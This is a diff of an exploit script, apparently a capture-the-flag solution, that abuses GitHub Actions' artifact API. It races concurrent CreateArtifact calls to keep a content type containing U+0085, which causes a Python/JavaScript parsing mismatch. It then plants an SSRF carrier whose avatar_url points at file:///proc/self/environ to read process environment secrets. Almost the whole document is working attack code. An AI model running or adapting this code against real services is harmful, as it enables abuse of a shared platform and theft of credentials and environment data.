@@ -7,54 +7,12 @@ import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index
 
 const ids = getBackendIdsFromToken();
 const client = internalArtifactTwirpClient({maxAttempts: 1});
-const placeholder = Buffer.from('{"probe":"mime"}');
+const odd = '\u0085application/json';
+const placeholder = Buffer.from('{"probe":"race"}');
 const hash = `sha256:${createHash('sha256').update(placeholder).digest('hex')}`;
+const winners = [];
 
-// Candidate CreateArtifact mimeType values. GitHub echoes the stored mimeType into
-// the SAS `rsct` override, so anything that survives validation decides the
-// Content-Type the CTF app and the postcard each parse.
-const MIMES = [
-  'application/json',
-  'application/json%85',
-  '%85application/json',
-  'application/json\u0085',
-  'application/json%1f',
-];
-const VERSIONS = [4, 6, 7, 8];
-const CANDIDATES = [];
-for (const version of VERSIONS) {
-  for (const mimeType of MIMES) {
-    CANDIDATES.push({version, mimeType, twice: false});
-  }
-}
-for (const version of [6, 7]) {
-  for (const mimeType of ['application/json', 'application/json%85']) {
-    CANDIDATES.push({version, mimeType, twice: true});
-  }
-}
-
-// Characters str.strip() removes but String.prototype.trim() keeps, and vice versa.
-const PY_SPACE = new Set([...'\t\n\u000b\f\r\u001c\u001d\u001e\u001f \u0085      　',
-  ...Array.from({length: 11}, (_, i) => String.fromCharCode(0x2000 + i))]);
-
-const jsType = value => value.split(',', 1)[0].split(';', 1)[0].trim().toLowerCase();
-
-function pyType(value) {
-  let head = value.split(',')[0];
-  head = head.split(';')[0];
-  let start = 0;
-  let end = head.length;
-  while (start < end && PY_SPACE.has(head[start])) start += 1;
-  while (end > start && PY_SPACE.has(head[end - 1])) end -= 1;
-  return head.slice(start, end).toLowerCase();
-}
-
-const escape = value => value === null || value === undefined
-  ? value
-  : JSON.stringify(value).slice(1, -1).replace(/[\u0080-￿]/g,
-    ch => `\\u${ch.charCodeAt(0).toString(16).padStart(4, '0')}`);
-
-async function create(name, mimeType, version) {
+async function create(name, version, mimeType) {
   try {
     const value = await client.CreateArtifact({
       workflowRunBackendId: ids.workflowRunBackendId,
@@ -65,14 +23,14 @@ async function create(name, mimeType, version) {
     });
     return {ok: true, url: value.signedUploadUrl};
   } catch (error) {
-    return {ok: false, error: String(error).slice(0, 200)};
+    return {ok: false, error: String(error).slice(0, 180)};
   }
 }
 
 async function upload(url, bytes) {
   if (!url) return false;
   await new BlobClient(url).getBlockBlobClient().uploadData(bytes, {
-    blobHTTPHeaders: {blobContentType: 'application/json'},
+    blobHTTPHeaders: {blobContentType: odd},
   });
   return true;
 }
@@ -88,7 +46,7 @@ async function finalize(name) {
     });
     return {ok: true, id: String(value.artifactId)};
   } catch (error) {
-    return {ok: false, error: String(error).slice(0, 200)};
+    return {ok: false, error: String(error).slice(0, 180)};
   }
 }
 
@@ -100,23 +58,9 @@ async function inspect(name) {
       name,
     });
     const url = new URL(value.signedUrl);
-    const rawQuery = url.search.slice(1).split('&').filter(part => part.startsWith('rsct'));
-    return {ok: true, url: value.signedUrl, rsctRaw: rawQuery.join('&'),
-      rsct: url.searchParams.get('rsct')};
+    return {ok: true, contentType: url.searchParams.get('rsct')};
   } catch (error) {
-    return {ok: false, error: String(error).slice(0, 200)};
-  }
-}
-
-// The decisive oracle: what Content-Type does the blob store actually emit?
-async function served(url) {
-  if (!url) return {ok: false, error: 'no url'};
-  try {
-    const response = await fetch(url);
-    return {ok: true, status: response.status,
-      contentType: response.headers.get('content-type')};
-  } catch (error) {
-    return {ok: false, error: String(error).slice(0, 200)};
+    return {ok: false, error: String(error).slice(0, 180)};
   }
 }
 
@@ -124,65 +68,60 @@ function carrierBytes(repository) {
   return Buffer.from(JSON.stringify({
     full_name: repository,
     owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
-    description: 'Repo Cassette artifact',
+    description: 'Repo Cassette concurrent carrier',
     stargazers_count: 0,
   }));
 }
 
-async function trial(index, {version, mimeType, twice}) {
-  const name = `cassette-${process.env.GITHUB_RUN_ID}-${index}`;
-  const first = twice ? await create(name, mimeType, version) : null;
-  const created = await create(name, mimeType, version);
-  await upload(created.url, placeholder).catch(() => false);
+async function trial(index) {
+  const name = `race-${process.env.GITHUB_RUN_ID}-${index}`;
+  // Version 6 accepts the odd MIME while version 7 selects raw delivery. Send
+  // both creates together so inconsistent name-based state can retain both.
+  const requests = index % 2 === 0
+    ? [create(name, 6, odd), create(name, 7, 'application/json')]
+    : [create(name, 7, 'application/json'), create(name, 6, odd)];
+  const created = await Promise.all(requests);
+  await Promise.all(created.map(item => upload(item.url, placeholder).catch(() => false)));
   const final = await finalize(name);
   const view = await inspect(name);
-  const probe = await served(view.url);
+  const isOdd = view.contentType?.includes('\u0085') ?? false;
   const row = {
-    index, name, version, twice, mimeType: escape(mimeType), id: final.id ?? null,
-    firstError: first && !first.ok ? first.error : undefined,
-    createError: created.ok ? undefined : created.error,
-    finalError: final.ok ? undefined : final.error,
-    viewError: view.ok ? undefined : view.error,
-    rsctRaw: view.rsctRaw ?? null,
-    rsct: escape(view.rsct ?? null),
-    servedStatus: probe.status ?? null,
-    servedContentType: escape(probe.contentType ?? null),
+    index,
+    order: index % 2 === 0 ? '6,7' : '7,6',
+    creates: created.map(item => item.ok ? {ok: true} : {ok: false, error: item.error}),
+    final: final.ok ? {ok: true, id: final.id} : final,
+    view: view.ok ? {ok: true, contentType: JSON.stringify(view.contentType).slice(1, -1)} : view,
+    isOdd,
   };
-  if (probe.contentType) {
-    row.pyType = escape(pyType(probe.contentType));
-    row.jsType = escape(jsType(probe.contentType));
-    row.differential = row.pyType === 'application/json' && row.jsType !== 'application/json';
-  }
-  // Replace the blob with the SSRF payload so the artifact is immediately usable.
-  if (final.id && created.url) {
+  if (isOdd && final.id) {
     const repository = `${process.env.GITHUB_REPOSITORY}/actions/artifacts/${final.id}/zip`;
-    const placed = await upload(created.url, carrierBytes(repository)).catch(() => false);
+    const body = carrierBytes(repository);
+    const placed = await Promise.all(
+      created.map(item => upload(item.url, body).catch(() => false)),
+    );
     row.repository = repository;
-    row.carrierPlaced = Boolean(placed);
+    row.carrierPlaced = placed.some(Boolean);
+    if (row.carrierPlaced) {
+      winners.push({id: final.id, name, repository});
+    }
   }
-  console.log(`ROW ${JSON.stringify(row)}`);
+  console.log(`RACE ${JSON.stringify(row)}`);
   return row;
 }
 
 const rows = [];
-for (let i = 0; i < CANDIDATES.length; i += 4) {
+for (let start = 0; start < 128; start += 16) {
   rows.push(...await Promise.all(
-    CANDIDATES.slice(i, i + 4).map((entry, offset) => trial(i + offset, entry)),
+    Array.from({length: 16}, (_, offset) => trial(start + offset)),
   ));
 }
-const winners = rows.filter(row => row.differential && row.id && row.carrierPlaced);
 const summary = {
   total: rows.length,
-  differential: winners.length,
-  servedTypes: Object.fromEntries(
-    Object.entries(rows.reduce((acc, row) => {
-      const key = String(row.servedContentType);
-      acc[key] = (acc[key] || 0) + 1;
-      return acc;
-    }, {})),
-  ),
+  odd: rows.filter(row => row.isOdd).length,
+  finalized: rows.filter(row => row.final?.ok).length,
+  bothCreated: rows.filter(row => row.creates.every(item => item.ok)).length,
 };
-console.log(`MIME_SUMMARY ${JSON.stringify(summary)}`);
+console.log(`RACE_SUMMARY ${JSON.stringify(summary)}`);
 writeFileSync('carrier-results.json', JSON.stringify({
   runId: process.env.GITHUB_RUN_ID,
   repository: process.env.GITHUB_REPOSITORY,
